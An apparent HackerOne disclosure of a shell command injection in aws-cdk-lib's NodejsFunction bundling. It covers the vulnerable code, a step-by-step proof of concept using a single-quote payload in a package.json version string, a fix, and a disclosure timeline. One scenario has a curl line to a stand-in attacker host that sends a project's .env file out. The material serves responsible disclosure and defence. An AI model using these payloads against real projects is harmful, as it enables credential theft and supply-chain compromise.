---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/os-command-injection
  - env/cloud
  - stack/aws
  - vuln/command-injection
  - vuln/code-injection
  - impact/rce
substate: "resolved"
weakness: "OS Command Injection"
enriched: true
body: true
date: 2026-07-06
submitted: 2026-03-30T12:48:07.193Z
bounty_usd: null
votes: 111
cve: []
program: "[[programs/aws_vdp|AWS VDP]]"
reporter: "kaporia"
source: "https://hackerone.com/reports/3637898"
title: "OS Command Injection in `aws-cdk-lib` NodejsFunction via Unsanitized `OsCommand` Helper (Supply Chain RCE)"
---
# OS Command Injection in `aws-cdk-lib` NodejsFunction via Unsanitized `OsCommand` Helper (Supply Chain RCE)

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 111 | **Program:** AWS VDP | **Disclosed:** 2026-07-06

- Report: [https://hackerone.com/reports/3637898](https://hackerone.com/reports/3637898)
- CWE: OS Command Injection
- Submitted: 2026-03-30T12:48:07.193Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Asset:** `aws-cdk-lib` (npm package), source: https://github.com/aws/aws-cdk
**Severity:** High
**CWE:** CWE-78 (Improper Neutralization of Special Elements used in an OS Command, 'OS Command Injection')

---

## Summary
The `NodejsFunction` construct in `aws-cdk-lib/aws-lambda-nodejs` uses an internal helper class named `OsCommand` to construct shell commands during Docker-based bundling. The `OsCommand.write()` and `OsCommand.writeJson()` methods wrap user-controlled data in single quotes (`echo '${data}'`) without escaping embedded single quotes.

When `nodeModules` is specified, the CDK reads dependency version strings from `package.json` via `extractDependencies()`, serializes them with `JSON.stringify()`, and passes them through `OsCommand.writeJson()`. Because `JSON.stringify()` preserves single quotes, a malicious dependency version containing `'` characters breaks out of the `echo` command and injects arbitrary shell commands.

The injected commands execute inside a Docker container that has **bind mounts** to the host filesystem:
- `/asset-input` → host project directory (read/write)
- `/asset-output` → host `.cdk.staging` directory (read/write)

This enables a **supply chain attack**: a malicious npm package with a crafted version string can achieve arbitrary command execution on any developer machine or CI/CD pipeline running `cdk synth` or `cdk deploy`.

---

## Why This is NOT Covered by Existing CDK Security Warnings

AWS CDK displays security warnings during `cdk synth` for user-facing APIs like `commandHooks` and `goBuildFlags`, these are explicitly developer-provided shell commands.

**This vulnerability is fundamentally different.** The injection occurs inside the CDK's own internal `OsCommand` helper class. The developer never writes a shell command. They simply declare standard npm dependencies in `package.json`. The CDK's internal code then unsafely interpolates version strings into a `bash -c` command **without any warning or sanitization**.

No existing CDK security warning covers this code path.

---

## Vulnerable Code
**File:** [`packages/aws-cdk-lib/aws-lambda-nodejs/lib/bundling.ts`](https://github.com/aws/aws-cdk/blob/main/packages/aws-cdk-lib/aws-lambda-nodejs/lib/bundling.ts)

1. ### `OsCommand.write()` Single-quote injection
```typescript
public write(filePath: string, data: string): string {
    // ...
    return `echo '${data}' > "${filePath}"`;
    //           ^ NO ESCAPING — single quotes in data break out
}
```

2. ### `OsCommand.writeJson()` calls `write()` with JSON.stringify output
```typescript
public writeJson(filePath: string, data: object): string {
    const stringifiedData = JSON.stringify(data);
    return this.write(filePath, stringifiedData);
    //     ^ JSON.stringify preserves single quotes from input
}
```

3. ### Docker bundling command assembly
When `nodeModules` is specified, `bundling.ts` constructs a Docker command:
```typescript
depsCommand = chain([
    osCommand.writeJson(pathJoin(options.outputDir, 'package.json'), { dependencies }),
    osCommand.copy(lockFilePath, pathJoin(options.outputDir, this.packageManager.lockFile)),
    osCommand.changeDirectory(options.outputDir),
    this.packageManager.installCommand.join(' '),
]);
```
This `depsCommand` is executed inside Docker via `bash -c`.

4. ### Existing (unused) escape function
The same file contains a `posixShellEscape` helper, but it is **not applied** to `OsCommand`:
```typescript
function posixShellEscape(arg: string): string {
    return "'" + arg.replace(/'/g, "'\\''") + "'";
}
```

---

## Proof of Concept (Verified)

### Prerequisites
- Node.js installed
- Docker installed and running
- npm installed

### Step 1: Create the project
```bash
mkdir cdk_poc_oscommand
cd cdk_poc_oscommand
npm init -y
```

### Step 2: Install dependencies
```bash
npm install aws-cdk-lib constructs aws-cdk typescript ts-node @types/node lodash
```

### Step 3: Create `tsconfig.json`
```json
{
  "compilerOptions": {
    "target": "es2020",
    "module": "commonjs",
    "strict": true,
    "skipLibCheck": true,
    "esModuleInterop": true,
    "outDir": "dist",
    "types": ["node"]
  }
}
```

### Step 4: Create `cdk.json`
```json
{
  "app": "npx ts-node app.ts"
}
```

### Step 5: Create `lambda/handler.js`
```bash
mkdir lambda
```
```javascript
// lambda/handler.js
exports.handler = async function() { return "OK"; }
```

### Step 6: Create `app.ts`
```typescript
import * as cdk from 'aws-cdk-lib';
import { NodejsFunction } from 'aws-cdk-lib/aws-lambda-nodejs';
import { Runtime } from 'aws-cdk-lib/aws-lambda';
import * as path from 'path';

const app = new cdk.App();
const stack = new cdk.Stack(app, 'ReproStack');

new NodejsFunction(stack, 'MyHandler', {
  entry: path.join(__dirname, 'lambda', 'handler.js'),
  runtime: Runtime.NODEJS_20_X,
  bundling: {
    forceDockerBundling: true,
    nodeModules: ['lodash'],
  },
});

app.synth();
```

### Step 7: Inject the payload into `package.json`
Edit the `lodash` dependency version in `package.json`:
```json
{
  "dependencies": {
    "lodash": "4.17.21' && touch /asset-input/pwned_via_json.txt && echo '"
  }
}
```
> **Note:** Leave all other dependencies unchanged. Only the `lodash` version needs the payload.

### Step 8: Run `cdk synth`
```bash
npx cdk synth
```

### Step 9: Verify the payload executed on the HOST filesystem
```bash
# Linux/macOS:
ls -la pwned_via_json.txt

# Windows (PowerShell):
Test-Path pwned_via_json.txt
```

**Expected output:** The file `pwned_via_json.txt` exists in the project root directory on the **host machine**.

---

## Verified Output

### Docker command generated by CDK (from actual execution log):
```bash
docker run --rm -u "1000:1000" \
  -v "C:\\h1\\AWS VDP\\cdk_poc_oscommand:/asset-input:delegated" \
  -v "C:\\h1\\AWS VDP\\cdk_poc_oscommand\\cdk.out\\bundling-temp-...:/asset-output:delegated" \
  -w "/" cdk-79d7bc6c... \
  bash -c "'esbuild' '--bundle' '/asset-input/lambda/handler.js' \
  '--target=node20' '--platform=node' '--outfile=/asset-output/index.js' \
  '--external:@aws-sdk/*' '--external:lodash' && \
  echo '{\"dependencies\":{\"lodash\":\"4.17.21' && \
  touch /asset-input/pwned_via_json.txt && \
  echo '\"}}' > \"/asset-output/package.json\" && \
  cp \"/asset-input/package-lock.json\" \"/asset-output/package-lock.json\" && \
  cd \"/asset-output\" && npm ci"
```

The single-quote injection splits the `echo` command into three separate shell commands:
1. `echo '{"dependencies":{"lodash":"4.17.21'`, truncated echo (harmless)
2. **`touch /asset-input/pwned_via_json.txt`**, **PAYLOAD EXECUTES**
3. `echo '"}}' > "/asset-output/package.json"`, broken JSON written

### Host filesystem verification:
```powershell
PS> Test-Path "████████\pwned_via_json.txt"
True
```

---

## Real-World Attack Scenario (Supply Chain)

A malicious actor publishes an npm package (e.g., `@company/analytics-helper`) with a crafted `package.json`:
```json
{
  "name": "@company/analytics-helper",
  "version": "2.1.0",
  "dependencies": {
    "lodash": "4.17.21' && curl https://attacker.com/exfil?d=$(cat /asset-input/.env|base64) && echo '"
  }
}
```

When a developer installs this package and runs `cdk synth` with `nodeModules`, the CDK's `extractDependencies()` reads the version string and injects it into a Docker `bash -c` command. The attacker exfiltrates the developer's `.env` file (containing AWS credentials, API keys, etc.) without the developer ever seeing a shell command or a security warning.

---

## Addressing Potential Mitigations

### "Docker provides isolation"
The Docker container uses **bind mounts** that map `/asset-input` to the host's project directory. Injected commands can read, modify, or delete files on the **host filesystem**, including `.env`, `.git/config`, source code, and potentially `~/.aws/credentials` if the project root is a parent directory.

### "The developer controls `package.json`"
In the supply chain scenario, the developer does **not** control the version strings of transitive dependencies. A malicious npm package deep in the dependency tree can inject arbitrary commands through its own `package.json` version declarations.

### "This is similar to `commandHooks`"
No. `commandHooks` is a **user-facing API** where the developer explicitly provides shell commands. CDK correctly warns about this. `OsCommand` is an **internal implementation detail**, the developer provides standard `package.json` dependency declarations and has no visibility into the shell commands generated internally.

---

## Remediation
Apply the existing `posixShellEscape` function (already in `bundling.ts`) to all `OsCommand` methods:

```typescript
class OsCommand {
  public write(filePath: string, data: string): string {
    if (this.osPlatform === 'win32') { ... }
    return `echo ${posixShellEscape(data)} > ${posixShellEscape(filePath)}`;
  }

  public copy(src: string, dest: string): string {
    if (this.osPlatform === 'win32') { ... }
    return `cp ${posixShellEscape(src)} ${posixShellEscape(dest)}`;
  }
}
```

## Impact

This vulnerability allows a remote attacker to achieve arbitrary Remote Code Execution (RCE) on the host machine where `cdk synth` or `cdk deploy` is executed. Through the use of a malicious npm dependency, the attacker can invisibly execute commands within the Docker bundling container, which shares bind mounts (`/asset-input` and `/asset-output`) with the host filesystem. This grants the attacker full read, write, and delete access to the developer's project directory, allowing them to exfiltrate sensitive secrets (such as `.env` files or AWS credentials), tamper with the deployed Lambda artifacts to insert backdoors, or compromise automated CI/CD pipelines.

**CVSS 3.1 Score:** 8.6 (High) `CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H`
*   **Attack Vector (Local):** The victim must pull the malicious package locally (or in a CI/CD runner) and execute the CDK CLI tool.
*   **User Interaction (Required):** The victim must run `cdk synth` or `cdk deploy`.
*   **Scope (Changed):** The command starts within the Docker container context but escapes to affect the host filesystem via bind mounts.
*   **Confidentiality, Integrity, Availability (High):** The attacker gains arbitrary code execution, allowing full read/write access to project files, secrets, and system resources.

## Timeline

- **Report Filed**
- **Report Severity Updated**
- **Report Informative**
- **2026-03-31** @kaporia: Hey there ████████,

Thank you so much for taking the time to review my report! I completely understand why it might initially look like a self-inflicted issue if viewed as a single-developer misconfiguration. I realize my initial explanation may not have highlighted the exact attack vector clearly enough. 

This is actually a **Software Supply Chain Vulnerability**, and the key detail is that the vulnerability does **not** require a user to deliberately configure their *own* `package.json` with the malicious payload. 

Instead, the malicious payload is placed inside the `package.json` of a **third-party npm dependency**. The vulnerable CDK user simply installs that benign-looking dependency from npm. When they do, the CDK tool blindly extracts the dependency's `package.json` version strings and reliably executes the OS command injection on the user's machine during the build process.

I've put together a verified, step-by-step reproduction that simulates this supply chain attack. In this scenario, the developer's `package.json` and CDK app are completely innocent. I would be super grateful if you could take a quick look at this scenario!

### Verified Exploitation Scenario (Supply Chain)

**Step 1: The attacker publishes a malicious CDK helper construct (simulated locally)**
```bash
mkdir -p node_modules/@evilcdk/analytics-helper
```

The attacker places this `package.json` deep inside the `node_modules/@evilcdk/analytics-helper/` directory:
```json
{
  "name": "@evilcdk/analytics-helper",
  "version": "2.1.0",
  "main": "index.js",
  "dependencies": {
    "lodash": "4.17.21' && touch /asset-input/PWNED_BY_EVILCDK.txt && echo '"
  }
}
```
And a simple `index.js`:
```javascript
exports.handler = async function() { return "Fake analytics uploaded OK"; };
```

**Step 2: The Victim Developer creates an innocent project**
The developer creates an innocent app and installs the attacker's package (e.g., via `npm install @evilcdk/analytics-helper`). Their own `package.json` is perfectly normal and innocent:
```json
{
  "name": "my-aws-app",
  "version": "1.0.0",
  "dependencies": {
    "aws-cdk-lib": "^2.133.0",
    "constructs": "^10.0.0",
    "@evilcdk/analytics-helper": "2.1.0"
  }
}
```

The developer points their `NodejsFunction` entry to the third-party helper they just installed in their `app.ts` file:
```typescript
import * as cdk from 'aws-cdk-lib';
import { NodejsFunction } from 'aws-cdk-lib/aws-lambda-nodejs';
import { Runtime } from 'aws-cdk-lib/aws-lambda';

const app = new cdk.App();
const stack = new cdk.Stack(app, 'ReproStack');

new NodejsFunction(stack, 'MyHandler', {
  // Innocent developer points to the 3rd party module
  entry: require.resolve('@evilcdk/analytics-helper/index.js'),
  runtime: Runtime.NODEJS_20_X,
  bundling: {
    forceDockerBundling: true,
    nodeModules: ['lodash'],
  },
});

app.synth();
```

**Step 3: The Exploit Triggers Silently**
When the victim runs `npx cdk synth`, the `NodejsFunction` construct automatically searches for the nearest `package.json` to the **entry file** (which in this case is the attacker's `package.json` inside the `node_modules` directory). 

The CDK reads the poisoned `lodash` version string, passes it to the unescaped `OsCommand.writeJson` helper, and executes the attacker's command inside the Docker container.

```bash
npx cdk synth
```

**Step 4: Verification of RCE on the Developer Machine**
Because the Docker container has a bind mount (`/asset-input`) mapped to the host's project directory, the attacker successfully writes to the developer's filesystem without the developer ever knowing.

```bash
ls -la PWNED_BY_EVILCDK.txt
# File exists! The injection succeeded.
```

### Why this bypasses standard defenses
The standard defense against malicious npm packages is running `npm install --ignore-scripts`. However, this attack **bypasses `--ignore-scripts`** because the code execution doesn't happen during `npm install`. The OS Command Injection happens directly inside the `aws-cdk` CLI tool itself during the `cdk synth` phase. 

The root cause here is just a missing `posixShellEscape()` call in the internal `OsCommand.write` method within `aws-lambda-nodejs/lib/bundling.ts`. The CDK authors already wrote the `posixShellEscape` function in that exact same file, it just appears they missed applying it to `writeJson()`. 

Since this enables a silent Supply Chain Remote Code Execution attack that specifically targets AWS customers' CI/CD pipelines and developer machines using the CDK, I really hope you might be able to re-evaluate or escalate this to the internal AWS CDK engineering team so they can add the shell escape method.

Thank you so much again for your time and for helping keep the AWS VDP program running smoothly!
- **2026-04-10** @kaporia: Hello ████████, 

I hope you’re having a great week! 

I’m just following up on my last comment from about 10 days ago. I understand you have a very high volume of reports, but I wanted to ensure the technical walkthrough of the Supply Chain vector didn't get buried. 

Since the reproduction steps prove that a victim developer is vulnerable even with an entirely 'innocent' package.json, I believe this discovery provides significant security value to the AWS CDK team. I’d be very grateful if you could take a quick look at the updated PoC or perhaps forward the report to the internal CDK team for a final technical assessment.

Thank you so much for your help!
- **2026-05-26** @kaporia: Hi ████████,

I am writing to follow up on the Supply Chain PoC I provided two months ago. Since the report remains closed as Informative, I assume the internal AWS CDK team has reviewed it and accepted the risk of the OsCommand.writeJson() OS command injection.

Because aws-cdk is a public open-source project, I am currently preparing a technical writeup about this specific supply-chain evasion vector, and I am planning to request a CVE ID from MITRE for the repository.

In accordance with HackerOne's Coordinated Vulnerability Disclosure guidelines, I would like to formally request Mutual Agreement to disclose this report. Could you please confirm if AWS is comfortable with me proceeding with public disclosure and the CVE request?

If the internal security team would prefer to re-evaluate the technical impact of the PoC before I proceed, I am more than happy to hold off on my end and give them the time they need.

Best regards, 
████████
- **Report Reopened**
- **Report Severity Updated**
- **Report Pending Program Review**
- **2026-05-28** @kaporia: Hi ████████,

Thank you so much for the update and for taking the time to discuss this with the AWS VDP team! I really appreciate your help.

I will gladly stand by and wait for the internal team's final review and severity evaluation. Please let me know if they need any further information from my side.

Best regards, 
████████
- **2026-05-28** @vulnguard: Hello ████████ ,

I hope you are doing great! 

I am with the AWS VDP team responsible for Coordinated Vulnerability Disclosure. Thank you for bringing your concern to our attention. We are currently reviewing your report and will provide you with an updates as they become available and on a monthly basis.

In the meantime, if you have any questions, you are welcome to let me know.

Regards,
████████
- **2026-06-22** @vulnguard: Hi ████████,

I hope you are having a great day. Happy Monday! 

Thank you for your patience while our team completed the internal review of your report. We wanted to provide you with an update on the status of your findings:

We have addressed the issue you reported. The relevant change has been included in AWS CDK v2.260.0, released on June 17, 2026.[1]

A CVE ID is being assigned through our internal CNA process, and an AWS Security Bulletin is being prepared for publication. Would you like to be credited in the AWS Security Bulletin? If so, please let us know how you would like to be attributed (e.g., your name, handle, and/or affiliated organization).

We noted your interest in publishing a blog post analyzing this supply chain vector. We are happy to coordinate timing with you. Please share your draft with us when it is ready so we can review it together, and let us know your planned publication timeline so we can align the bulletin and CVE publication accordingly.

Thank you for your diligence in reporting this finding and for working with us through the coordinated disclosure process. We appreciate your contribution to helping keep AWS customers secure.

Regards, 
████████ 

[1] - https://github.com/aws/aws-cdk/pull/38133
- **2026-06-29** @kaporia: Hi AWS Security Team,

Thank you for the update and for the swift work in addressing this vulnerability in AWS CDK v2.260.0.

Regarding your questions:

1. **Security Bulletin Attribution:**
   Yes, I would be glad to be credited in the AWS Security Bulletin. Please attribute the credit as follows:
   * **Name:** ████████
   * **LinkedIn:** ████████
   * **HackerOne Handle:** ████████
   *(I prefer linking my LinkedIn profile if only one link is supported, but linking both LinkedIn and my HackerOne profile would be ideal.)*

2. **Blog Post & Timeline Coordination:**
   I have prepared a draft of the technical writeup summarizing the vulnerability, root cause, and supply chain impact. I have attached the draft writeup ████████ to this report (and pasted the markdown below for your convenience).
   
   For the publication timeline, I will align my publication with your security bulletin release. Please let me know once the bulletin and CVE publication date is scheduled, and I will publish my writeup and PoC repository simultaneously.

I look forward to your technical review and feedback on the draft.

Thank you again for your collaboration!

Best regards,
████████ (████████)
- **2026-06-29** @vulnguard: Hello ████████,

I hope you are doing well! Happy Monday!

Thank you for sending over your draft writeup. We appreciate the thoroughness and clarity of your analysis. We will review it internally and provide our feedback as soon as possible.

Regarding attribution in the AWS Security Bulletin: we are not able to include LinkedIn links or HackerOne handles in the bulletin, but we will credit you by your full name.

If you have an affiliated organization you'd like included alongside your name, please let us know and we'll be happy to add that as well.

We'll be in touch once we've completed our review of the draft. Thank you again for your collaboration throughout this process and for your commitment to coordinated disclosure.

Regards, 
████████
- **2026-06-30** @vulnguard: Hi ████████,

Thank you for sharing your draft write up. We appreciate the quality and thoroughness of your work.

Our team has completed the technical review. Please find our line-by-line feedback here:

████████
████████

We appreciate if you consider incorporating them. Please let us know if you have any questions.

We are planning to publish the CVE and AWS Security Bulletin on July 1, 2026. We will share the links to the Security Bulletin, CVE, and GHSA with you once they are released.

You will be credited as: ████████ , ████████

Once the CVE and bulletin is published, you are welcome to include the link in your blog and publish your writeup simultaneously.

Thank you again for your collaboration and commitment to coordinated disclosure!

Regards, 
████████
- **2026-07-06** @kaporia: Hi ████████,

I hope you are doing well.

Since the security bulletin (2026-050-AWS) and CVE (CVE-2026-13760) were published on July 1, 2026, could you please transition this report to "Resolved" and initiate the public disclosure process on HackerOne? I would love to include the link to this HackerOne report in my technical writeup and announcement.

Thank you again for your help and collaboration throughout this process!

Best regards,
████████
- **Report Severity Updated**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **2026-08-05** @vulnguard: Hello @kaporia 

Quick follow-up - did you end up publishing your blog post? If not, no worries at all. 

If you are still planning to publish a blog post regarding your research, you are welcome to send a copy of the draft to aws-security@amazon.com and we would be happy to provide technical feedback. If it is easier, you are welcome to request public disclosure of this HackerOne report and we will review the request.

Regards,
@vulnguard
